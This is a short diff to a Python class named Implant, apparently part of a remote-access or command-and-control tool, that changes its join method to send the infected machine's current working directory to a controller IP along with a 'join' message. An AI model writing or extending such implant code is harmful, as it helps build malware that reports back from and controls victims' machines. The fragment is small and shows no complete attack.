@@ -23,7 +23,7 @@ class Implant(Host):
         
 
     def join(self, shellpack):
-        self.send(shellpack['ip'], "join")
+        self.send(shellpack['ip'], "join", os.getcwd().encode())
 
     def instruction(self, shellpack):
         try:
